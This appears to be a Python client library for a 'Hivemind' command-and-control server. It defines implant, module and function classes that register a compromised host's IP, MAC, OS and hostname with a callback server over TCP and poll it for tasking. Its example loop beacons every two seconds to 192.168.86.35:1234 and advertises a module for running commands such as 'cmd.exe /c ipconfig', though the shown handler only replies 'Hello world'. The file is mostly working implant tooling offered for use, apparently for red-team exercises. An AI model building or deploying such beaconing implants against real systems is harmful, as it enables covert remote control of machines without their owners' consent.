import json
import socket
import time
from enum import Enum
from typing import List, Dict, Optional, Any


class ParamTypes(Enum):
    STRING = 'String'
    DOUBLE = 'Double'
    INT = 'Int'


class PacketType(Enum):
    ERROR_CODE = -1
    NO_ACTION = 0
    ACTION_REQUEST = 1
    ACTION_CODE = 2
    ACTION_RESPONSE_CODE = 3
    REGISTRATION_REQUEST_CODE = 4
    REGISTRATION_RESPONSE_CODE = 5


class ModuleFunc:
    def __init__(self, module_func_name: str, module_func_desc: str, param_names: List[str] = None,
                 param_types: List[ParamTypes] = None) -> None:
        """
        Creates an instance of a ModuleFunc

        @param module_func_name: Name of the function
        @param module_func_desc: A description for the function
        @param param_names: A list of parameter names
        @param param_types: A list of ParamTypes representing the parameter types
        @rtype: ModuleFunc instance of object
        """
        if param_types is None:
            param_types = []
        if param_names is None:
            param_names = []
        if not all(isinstance(v, str) for v in [module_func_desc, module_func_name]):
            raise TypeError("All required parameters must be strings")
        if len(param_names) != len(param_types):
            raise ValueError("Length of the param_names and param_types do not match")
        if not all(isinstance(param_type, ParamTypes) for param_type in param_types):
            raise TypeError("param_types must be of type ParamTypes")
        if not all(isinstance(param_name, str) for param_name in param_names):
            raise TypeError("param_names must be of type Str")
        self._moduleFuncDesc = module_func_desc
        self._moduleFuncName = module_func_name
        self._paramNames = param_names
        self._paramNum = len(param_types)
        self._paramTypes = param_types

    @property
    def to_dict(self) -> dict:
        """
        Converts this ModuleFunc to a dictionary representation for Hivemind

        @rtype: dict
        """
        return {
            "module_func_desc": self._moduleFuncDesc,
            "module_func_name": self._moduleFuncName,
            "param_names": self._paramNames,
            "param_num": self._paramNum,
            "param_types": [param_type.value for param_type in self._paramTypes]
        }


class Module:
    def __init__(self, module_name: str, module_desc: str, module_funcs: List[ModuleFunc] = None) -> None:
        """
        Creates an instance of a Module

        @rtype: Module
        @param module_name: Name of the module
        @param module_desc: Description for the module
        @param module_funcs: List of ModuleFunc
        """
        if module_funcs is None:
            module_funcs = []
        if not all(isinstance(f, ModuleFunc) for f in module_funcs):
            raise TypeError("module_funcs must be of type ModuleFunc")
        if not all(isinstance(v, str) for v in [module_name, module_desc]):
            raise TypeError("All required parameters must be strings")
        self._moduleName = module_name
        self._moduleDesc = module_desc
        self._moduleFuncs = module_funcs

    def add_module_func(self, module_func: ModuleFunc) -> None:
        """
        Add a ModuleFunc to the module

        @param module_func: ModuleFunc to add to this Module
        """
        if not isinstance(module_func, ModuleFunc):
            raise TypeError("module_func must be a instance of ModuleFunc")
        self._moduleFuncs.append(module_func)

    @property
    def to_dict(self) -> dict:
        """
        Converts this Module to a dictionary representation for Hivemind

        @rtype: dict
        """
        return {
            "module_desc": self._moduleDesc,
            "module_funcs": [f.to_dict for f in self._moduleFuncs],
            "module_name": self._moduleName
        }


class Implant:
    def __init__(self, ip: str, mac: str, os: str, hostname: str, implant_name: str, implant_version: str,
                 other_ips: List[str] = None) -> None:
        """
        Creates an instance of a Implant

        @rtype: Implant
        @param ip: IP of system
        @param mac: MAC address of system
        @param os: OS of system
        @param hostname: Hostname of system
        @param implant_name: Name of this Implant Type
        @param implant_version: Version for this Implant Type
        @param other_ips: List of other IPs this device has
        """
        if other_ips is None:
            other_ips = []
        if not all(v is not None for v in [ip, mac, os, hostname, implant_name, implant_version]):
            raise TypeError("All required parameters can't be None")
        if not all(isinstance(v, str) for v in [ip, mac, os, hostname, implant_name, implant_version]):
            raise TypeError("All required parameters must be strings")
        self.ip = ip
        self._mac = mac
        self._os = os
        self._hostname = hostname
        self._implantName = implant_name
        self._implantVersion = implant_version
        self._otherIps = other_ips
        self.uuid = None
        self._supportedModules = []

    def add_module(self, module: Module) -> None:
        """
        Add a module to the Implant

        @param module: A module to add to the Implant
        """
        if not isinstance(module, Module):
            raise TypeError("module must be a instance of Module")
        self._supportedModules.append(module)

    @property
    def to_dict(self) -> dict:
        """
        Converts this Implant to a dictionary representation for Hivemind

        @rtype: dict
        """
        return {
            "ip": self.ip,
            "mac": self._mac,
            "os": self._os,
            "hostname": self._hostname,
            "implant_name": self._implantName,
            "implant_version": self._implantVersion,
            "other_ips": self._otherIps,
            "supported_modules": [m.to_dict for m in self._supportedModules]
        }


class Hivemind:
    def __init__(self) -> None:
        """
        Creates an instance of a Hivemind only one needed.

        @rtype: Hivemind
        """
        self._saved_uuids = {}
        self._saved_implant_info = {}
        self._serveIPAndPort = None

    def set_callback_server(self, ip: str, port: int) -> None:
        """
        Set the IP and port for which Hivemind server to connect to

        @param ip: The IP of the Hivemind server
        @param port: The port of the Hivemind server
        """
        self._serveIPAndPort = (ip, port)

    def _generate_packet(self, data: str, packet_type: int, identifier: str) -> Dict[str, str]:
        """
        Create a dictionary representation of a packet to send to Hivemind

        @param data: Data to send
        @param packet_type: What packet type this is
        @param identifier: The identifier for the implant this packet is for
        @rtype: dict
        """
        return {
            "data": data,
            "fingerprint": "fingerprint",
            "implant_info": {
                "UUID": self._saved_uuids.get(identifier),
                "primary_iP": self._saved_implant_info[identifier].ip
            },
            "numLeft": 0,
            "packet_type": packet_type
        }

    def _send_and_receive(self, data: Dict[str, str]) -> Optional[Any]:
        """
        Sends a packet and receives information back

        @param data: dictionary representation of a Hivemind packet to send
        @rtype: List[Dict[str, str]]
        """
        if self._serveIPAndPort is None:
            raise TypeError('Ip and port for server is None')
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.connect(self._serveIPAndPort)
        sock.send(json.dumps(data).encode('utf-8'))
        sock.shutdown(socket.SHUT_WR)
        data_received = sock.recv(1024)
        sock.close()
        if data_received.strip() != b'':
            info = json.loads(data_received)
            return info
        return None

    def _send_and_close(self, data: Dict[str, str]) -> None:
        """
        Sends a packet and no information to receive

        @param data: dictionary representation of a Hivemind packet to send
        """
        if self._serveIPAndPort is None:
            raise TypeError('Ip and port for server is None')
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.connect(self._serveIPAndPort)
        sock.send(json.dumps(data).encode('utf-8'))
        sock.close()

    def _register(self, identifier: str, implant_info: Implant) -> None:
        """

        @param identifier: The identifier for the implant this packet is for
        @param implant_info: The Implant object for the implant we are registering
        """
        info = implant_info.to_dict
        p = self._generate_packet(json.dumps(info), PacketType.REGISTRATION_REQUEST_CODE.value, identifier)
        ret = self._send_and_receive(p)
        if ret is not None:
            uuid = ret[0]['implant_info']['uuid']
            self._saved_uuids[identifier] = uuid

    def _callback(self, identifier: str) -> List[Dict[str, str]]:
        """

        @param identifier: The identifier for the implant this packet is for
        @rtype: List[Dict[str, str]]
        """
        p = self._generate_packet('', PacketType.ACTION_REQUEST.value, identifier)
        ret = self._send_and_receive(p)
        return ret

    def _send_response(self, identifier: str, action_id: str, response: str) -> None:
        """

        @param identifier: The identifier for the implant this packet is for
        @param action_id: action_id for the action we are responding to
        @param response: response for this action
        """
        action_resp = {
            "action_id": action_id,
            "response": response
        }
        p = self._generate_packet(json.dumps(action_resp), PacketType.ACTION_RESPONSE_CODE.value, identifier)
        self._send_and_close(p)

    def implant_callback(self, identifier: str, implant_info: Implant) -> Optional[Any]:
        """
        Make a callback for a particular implant to the Hivemind server and return the result

        @param identifier: The identifier for the implant this packet is for
        @param implant_info: The Implant object for the implant we are calling back for
        """
        if not isinstance(implant_info, Implant):
            raise TypeError("implant must be a instance of Implant")
        if identifier not in self._saved_uuids:
            self._saved_implant_info[identifier] = implant_info
            self._register(identifier, implant_info)
        callback_responses = self._callback(identifier)
        if isinstance(callback_responses, list):
            if callback_responses[0]['data'] != '':
                ret = [json.loads(response['data']) for response in callback_responses]
            else:
                ret = None
            return ret
        return None

    def implant_response(self, identifier: str, action_id: str, data: str) -> None:
        """
        Send an implant response for a particular action to the Hivemind server

        @param identifier: The identifier for the implant this packet is for
        @param action_id: action_id for the action we are responding to
        @param data: Response to send to the Hivemind server
        """
        if identifier in self._saved_uuids:
            self._send_response(identifier, action_id, data)


if __name__ == '__main__':
    hivemind = Hivemind()
    hivemind.set_callback_server('192.168.86.35', 1234)
    cmd_func = ModuleFunc('cmd', 'Run a executable, ie. cmd.exe /c ipconfig', ['command'], [ParamTypes.STRING])
    mod = Module('BP Command Module', 'Module for running commands', [cmd_func])
    implant = Implant('192.168.5.1', 'aa:ss:dd:ff:gg:hh', 'Windows', 'Hostname', 'BP', '1.0')
    implant.add_module(mod)
    while True:
        time.sleep(2)
        tmp = hivemind.implant_callback(implant.ip, implant)
        if tmp is not None:
            for x in tmp:
                hivemind.implant_response(implant.ip, x['action_id'], 'Hello world')
